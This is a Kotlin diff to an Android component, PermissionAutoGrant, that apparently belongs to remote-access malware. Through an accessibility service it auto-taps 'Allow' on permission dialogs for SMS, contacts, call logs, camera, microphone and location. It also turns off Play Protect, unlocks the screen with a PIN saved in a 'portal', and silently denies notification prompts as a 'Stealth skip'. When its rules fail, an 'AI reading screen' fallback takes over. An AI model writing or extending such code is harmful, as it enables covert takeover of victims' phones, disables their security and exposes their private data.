@@ -98,7 +98,51 @@ object PermissionAutoGrant {
         fun onError(message: String)
     }
 
-    data class TapTarget(val cx: Float, val cy: Float, val label: String, val score: Int)
+    data class TapTarget(val cx: Float, val cy: Float, val label: String, val score: Int, val nodeId: String = "")
+
+    private const val MIN_DIALOG_SCORE = 55
+    private const val MIN_SETTINGS_SCORE = 45
+    private const val DIALOG_WAIT_MS = 3_500L
+
+    private val PERMISSION_PACKAGES = listOf(
+        "permissioncontroller",
+        "packageinstaller",
+        "securitypermission",
+        "safecenter",
+        "permission",
+        "coloros",
+        "oplus",
+        "systemui",
+    )
+
+    private val PERMISSION_SCREEN_HINTS = listOf(
+        "permission",
+        "allow access",
+        "needs access",
+        "access your",
+        "to access",
+        "while using the app",
+        "while using this app",
+        "all the time",
+        "only this time",
+        "precise location",
+        "approximate location",
+        "allow notifications",
+        "record audio",
+        "take pictures",
+        "read contacts",
+        "read sms",
+        "phone calls",
+        "call logs",
+        "location",
+        "camera",
+        "microphone",
+        "contacts",
+    )
+
+    private val LOCK_SWIPE_HINTS = listOf(
+        "swipe", "slide", "unlock", "向上", "滑动",
+    )
 
     fun isRunning(): Boolean = running.get()
 
@@ -204,7 +248,8 @@ object PermissionAutoGrant {
             val cx = (b.getInt(0) + b.getInt(2)) / 2f
             val cy = (b.getInt(1) + b.getInt(3)) / 2f
             val score = 30 + if (lower.contains("permission")) 20 else 0
-            val target = TapTarget(cx, cy, text.take(40), score)
+            val nodeId = n.optString("id", "")
+            val target = TapTarget(cx, cy, text.take(40), score, nodeId)
             if (best == null || target.score > best.score) best = target
         }
         return best
@@ -223,60 +268,106 @@ object PermissionAutoGrant {
             return
         }
 
+        if (!LockScreenHelper.ensureUnlocked(context, service, 18_000L)) {
+            cb.onLog("Screen locked — unlock manually or save PIN in portal")
+        }
+        Thread.sleep(300)
+
         val start = System.currentTimeMillis()
         var taps = 0
         var consecutiveMisses = 0
         var agentFallbacks = 0
         var scrollAttempts = 0
+        var dialogWaitStart = if (mode == Mode.DIALOG) System.currentTimeMillis() else 0L
+        var lastTapKey = ""
         val scrollModes = setOf(Mode.SETTINGS, Mode.PLAY_PROTECT, Mode.APP_TOGGLE)
 
         while (running.get()) {
             val elapsed = System.currentTimeMillis() - start
             if (elapsed >= maxDurationMs || taps >= MAX_TAPS) break
 
-            val tree = service.snapshotTree() ?: service.lastTreeJson
+            service.scheduleRefreshesAfterInput(forceFull = consecutiveMisses >= 2)
+            Thread.sleep(if (consecutiveMisses >= 2) 180 else SCAN_INTERVAL_MS)
+
+            val tree = service.snapshotTree(forceFull = consecutiveMisses >= 2) ?: service.lastTreeJson
             if (tree == null) {
+                Thread.sleep(SCAN_INTERVAL_MS)
+                continue
+            }
+
+            if (mode == Mode.DIALOG && !isPermissionScreen(tree)) {
+                if (System.currentTimeMillis() - dialogWaitStart < DIALOG_WAIT_MS) {
+                    Thread.sleep(SCAN_INTERVAL_MS)
+                    continue
+                }
+                cb.onLog("No permission dialog visible — waiting")
+                consecutiveMisses++
+                if (consecutiveMisses >= STUCK_THRESHOLD + 2) break
                 Thread.sleep(SCAN_INTERVAL_MS)
                 continue
             }
 
             val target = when {
                 mode == Mode.DIALOG && isNotificationPermissionDialog(tree) -> findDenyTarget(tree)
+                mode == Mode.DIALOG -> findDialogAllowTarget(tree)
                 mode == Mode.SETTINGS -> findSettingsTarget(tree)
                 mode == Mode.PLAY_PROTECT -> findPlayProtectTarget(tree)
                 mode == Mode.APP_TOGGLE -> findAppToggleTarget(tree, appLabels)
                 else -> findBestTarget(tree)
             }
-            if (target != null) {
+
+            val minScore = if (mode == Mode.DIALOG) MIN_DIALOG_SCORE else MIN_SETTINGS_SCORE
+            if (target != null && target.score >= minScore) {
+                val tapKey = "${target.nodeId}|${target.cx.toInt()},${target.cy.toInt()}"
+                if (tapKey == lastTapKey) {
+                    consecutiveMisses++
+                    if (consecutiveMisses >= STUCK_THRESHOLD && agentFallbacks < 3) {
+                        agentFallbacks++
+                        consecutiveMisses = 0
+                        cb.onLog("AI reading screen…")
+                        if (tryAgentFallback(context, tree, cb, mode)) {
+                            taps++
+                            lastTapKey = ""
+                            Thread.sleep(500)
+                            continue
+                        }
+                    }
+                    Thread.sleep(SCAN_INTERVAL_MS)
+                    continue
+                }
+
                 consecutiveMisses = 0
                 scrollAttempts = 0
+                lastTapKey = tapKey
                 cb.onLog(
                     if (mode == Mode.DIALOG && isNotificationPermissionDialog(tree)) "Stealth skip → ${target.label}"
-                    else "Allow → ${target.label}",
+                    else "Allow → ${target.label} (${target.score})",
                 )
-                service.tapAt(target.cx, target.cy)
+                performTap(service, target)
                 taps++
-                Thread.sleep(TAP_INTERVAL_MS)
-                service.scheduleRefreshesAfterInput()
-                Thread.sleep(SCAN_INTERVAL_MS)
+                Thread.sleep(TAP_INTERVAL_MS + 120)
+                service.scheduleRefreshesAfterInput(forceFull = true)
+                Thread.sleep(SCAN_INTERVAL_MS + 80)
             } else {
                 consecutiveMisses++
                 if (mode in scrollModes && consecutiveMisses >= 2 && scrollAttempts < 10) {
                     scrollAttempts++
                     consecutiveMisses = 0
+                    lastTapKey = ""
                     val w = RelayHub.screenWidth.toFloat()
                     val h = RelayHub.screenHeight.toFloat()
                     service.swipe(w / 2f, h * 0.75f, w / 2f, h * 0.25f, 250)
                     Thread.sleep(400)
                     continue
                 }
-                if (consecutiveMisses >= STUCK_THRESHOLD && agentFallbacks < 2) {
+                if (consecutiveMisses >= STUCK_THRESHOLD && agentFallbacks < 3) {
                     agentFallbacks++
                     consecutiveMisses = 0
+                    lastTapKey = ""
                     cb.onLog("AI reading screen…")
                     if (tryAgentFallback(context, tree, cb, mode)) {
                         taps++
-                        Thread.sleep(400)
+                        Thread.sleep(500)
                         continue
                     }
                 }
@@ -287,6 +378,92 @@ object PermissionAutoGrant {
 
         cb.onLog(if (taps > 0) "Finished — $taps step(s)" else "Scan complete")
         cb.onDone(taps)
+    }
+
+    private fun performTap(service: TouchAccessibilityService, target: TapTarget) {
+        if (target.nodeId.isNotEmpty() && service.clickById(target.nodeId)) return
+        service.tapAt(target.cx, target.cy)
+    }
+
+    private fun isPermissionScreen(tree: JSONObject): Boolean {
+        val pkg = tree.optString("pkg", "").lowercase()
+        if (PERMISSION_PACKAGES.any { pkg.contains(it) }) return true
+        if (tree.optInt("popup", 0) == 1 && screenHasPermissionHints(tree)) return true
+        return screenHasPermissionHints(tree) && hasAllowButton(tree)
+    }
+
+    private fun screenHasPermissionHints(tree: JSONObject): Boolean {
+        val nodes = tree.optJSONArray("nodes") ?: return false
+        var hits = 0
+        for (i in 0 until nodes.length()) {
+            val text = nodes.getJSONObject(i).optString("t", "")
+                .ifBlank { nodes.getJSONObject(i).optString("h", "") }
+                .lowercase()
+            if (text.isBlank()) continue
+            if (PERMISSION_SCREEN_HINTS.any { text.contains(it) }) hits++
+        }
+        return hits >= 1
+    }
+
+    private fun hasAllowButton(tree: JSONObject): Boolean {
+        val nodes = tree.optJSONArray("nodes") ?: return false
+        for (i in 0 until nodes.length()) {
+            val n = nodes.getJSONObject(i)
+            if (n.optInt("d", 0) == 1) continue
+            val text = n.optString("t", "").ifBlank { n.optString("h", "") }
+            if (text.isBlank()) continue
+            val clickable = n.optInt("k", 0) == 1 || n.optInt("x", -1) >= 0
+            if (!clickable) continue
+            if (matchesAllow(text) && !matchesDeny(text)) return true
+        }
+        return false
+    }
+
+    private fun findDialogAllowTarget(tree: JSONObject): TapTarget? {
+        val nodes = tree.optJSONArray("nodes") ?: return null
+        val isPopup = tree.optInt("popup", 0) == 1
+        var best: TapTarget? = null
+
+        for (i in 0 until nodes.length()) {
+            val n = nodes.getJSONObject(i)
+            if (n.optInt("d", 0) == 1) continue
+            val text = n.optString("t", "").ifBlank { n.optString("h", "") }
+            val clickable = n.optInt("k", 0) == 1
+            val checkable = n.optInt("x", -1) >= 0
+            val checked = n.optInt("x", 0) == 1
+            val onPopup = n.optInt("pop", 0) == 1 || isPopup
+            val role = n.optString("r", "")
+            val b = n.optJSONArray("b") ?: continue
+            if (b.length() < 4) continue
+            val cx = (b.getInt(0) + b.getInt(2)) / 2f
+            val cy = (b.getInt(1) + b.getInt(3)) / 2f
+            val nodeId = n.optString("id", "")
+
+            if (checkable && !checked && text.isNotBlank()) {
+                if (matchesAllow(text) && !matchesDeny(text)) {
+                    val target = TapTarget(cx, cy, text.take(40), scoreTarget(text, onPopup, role, true), nodeId)
+                    if (best == null || target.score > best.score) best = target
+                }
+                continue
+            }
+            if (!clickable || text.isBlank()) continue
+            if (matchesDeny(text)) continue
+            if (!matchesAllow(text)) continue
+            if (!onPopup && !isStrongAllowLabel(text)) continue
+            val target = TapTarget(cx, cy, text.take(40), scoreTarget(text, onPopup, role, false), nodeId)
+            if (best == null || target.score > best.score) best = target
+        }
+        return best
+    }
+
+    private fun isStrongAllowLabel(text: String): Boolean {
+        val lower = text.lowercase()
+        return lower.contains("allow") ||
+            lower.contains("while using") ||
+            lower.contains("all the time") ||
+            lower.contains("only this time") ||
+            lower.contains("turn on") ||
+            lower.contains("grant")
     }
 
     private fun findPlayProtectTarget(tree: JSONObject): TapTarget? {
@@ -309,7 +486,7 @@ object PermissionAutoGrant {
             val cy = (b.getInt(1) + b.getInt(3)) / 2f
 
             if (checkable && checked && PLAY_PROTECT_OFF.any { lower.contains(it) }) {
-                val t = TapTarget(cx, cy, text.take(40), 90)
+                val t = TapTarget(cx, cy, text.take(40), 90, n.optString("id", ""))
                 if (bestOff == null || t.score > bestOff.score) bestOff = t
             }
             if (checkable && !checked && PLAY_PROTECT_OFF.any { lower.contains(it) }) {
@@ -317,7 +494,7 @@ object PermissionAutoGrant {
             }
             if ((checkable && !checked) || clickable) {
                 if (PLAY_PROTECT_ALLOW.any { lower.contains(it) } && !matchesDeny(text)) {
-                    val t = TapTarget(cx, cy, text.take(40), 75)
+                    val t = TapTarget(cx, cy, text.take(40), 75, n.optString("id", ""))
                     if (bestAllow == null || t.score > bestAllow.score) bestAllow = t
                 }
             }
@@ -360,7 +537,7 @@ object PermissionAutoGrant {
             if (appRowY >= 0 && kotlin.math.abs(cy - appRowY) < 120) score += 40
             if (appLabels.any { text.lowercase().contains(it.lowercase()) }) score += 35
             if (score >= 50) {
-                val t = TapTarget(cx, cy, text.take(40).ifBlank { "toggle" }, score)
+                val t = TapTarget(cx, cy, text.take(40).ifBlank { "toggle" }, score, n.optString("id", ""))
                 if (bestToggle == null || t.score > bestToggle.score) bestToggle = t
             }
         }
@@ -388,16 +565,16 @@ object PermissionAutoGrant {
             val cy = (b.getInt(1) + b.getInt(3)) / 2f
 
             if (checkable && !checked && matchesAllow(text) && !matchesDeny(text)) {
-                val t = TapTarget(cx, cy, text.take(40), 80)
+                val t = TapTarget(cx, cy, text.take(40), 80, n.optString("id", ""))
                 if (bestAllow == null || t.score > bestAllow.score) bestAllow = t
             }
             if (clickable && DENIED_ROW_KEYWORDS.any { lower.contains(it) }) {
                 if (STEALTH_SKIP_SETTINGS.any { lower.contains(it) }) continue
-                val t = TapTarget(cx, cy, text.take(40), 70)
+                val t = TapTarget(cx, cy, text.take(40), 70, n.optString("id", ""))
                 if (bestDenied == null || t.score > bestDenied.score) bestDenied = t
             }
             if (clickable && matchesAllow(text) && !matchesDeny(text)) {
-                val t = TapTarget(cx, cy, text.take(40), scoreTarget(text, false, n.optString("r", ""), false))
+                val t = TapTarget(cx, cy, text.take(40), scoreTarget(text, false, n.optString("r", ""), false), n.optString("id", ""))
                 if (bestAllow == null || t.score > bestAllow.score) bestAllow = t
             }
         }
@@ -422,10 +599,11 @@ object PermissionAutoGrant {
             if (b.length() < 4) continue
             val cx = (b.getInt(0) + b.getInt(2)) / 2f
             val cy = (b.getInt(1) + b.getInt(3)) / 2f
+            val nodeId = n.optString("id", "")
 
             if (checkable && !checked && text.isNotBlank()) {
                 if (matchesAllow(text) && !matchesDeny(text)) {
-                    val target = TapTarget(cx, cy, text.take(40), scoreTarget(text, onPopup, role, true))
+                    val target = TapTarget(cx, cy, text.take(40), scoreTarget(text, onPopup, role, true), nodeId)
                     if (best == null || target.score > best.score) best = target
                 }
                 continue
@@ -433,7 +611,8 @@ object PermissionAutoGrant {
             if (!clickable || text.isBlank()) continue
             if (matchesDeny(text)) continue
             if (!matchesAllow(text)) continue
-            val target = TapTarget(cx, cy, text.take(40), scoreTarget(text, onPopup, role, false))
+            if (!onPopup && !isStrongAllowLabel(text)) continue
+            val target = TapTarget(cx, cy, text.take(40), scoreTarget(text, onPopup, role, false), nodeId)
             if (best == null || target.score > best.score) best = target
         }
         return best
@@ -442,17 +621,18 @@ object PermissionAutoGrant {
     private fun scoreTarget(text: String, onPopup: Boolean, role: String, isToggle: Boolean): Int {
         var score = 0
         val lower = text.lowercase()
-        if (onPopup) score += 50
+        if (onPopup) score += 55
         if (role == "btn") score += 20
         if (isToggle) score += 15
         when {
-            lower == "allow" -> score += 40
-            lower.contains("while using") || lower.contains("while in use") -> score += 38
-            lower.contains("all the time") || lower.contains("always") -> score += 36
-            lower.contains("only this time") || lower.contains("just once") -> score += 32
-            lower == "ok" || lower == "continue" -> score += 28
-            lower.contains("allow") -> score += 22
-            lower.contains("turn on") || lower.contains("enable") -> score += 20
+            lower == "allow" -> score += 45
+            lower.contains("while using") || lower.contains("while in use") -> score += 42
+            lower.contains("all the time") || lower.contains("always") -> score += 40
+            lower.contains("only this time") || lower.contains("just once") -> score += 38
+            lower.contains("allow") -> score += 30
+            lower.contains("turn on") || lower.contains("enable") -> score += 22
+            lower == "ok" || lower == "continue" -> score += if (onPopup) 25 else 5
+            lower == "yes" || lower == "accept" -> score += if (onPopup) 20 else 3
         }
         return score
     }
@@ -513,7 +693,7 @@ object PermissionAutoGrant {
             var score = 40
             if (lower.contains("don't allow") || lower.contains("dont allow")) score += 30
             if (lower.contains("not now")) score += 20
-            val target = TapTarget(cx, cy, text.take(40), score)
+            val target = TapTarget(cx, cy, text.take(40), score, n.optString("id", ""))
             if (best == null || target.score > best.score) best = target
         }
         return best
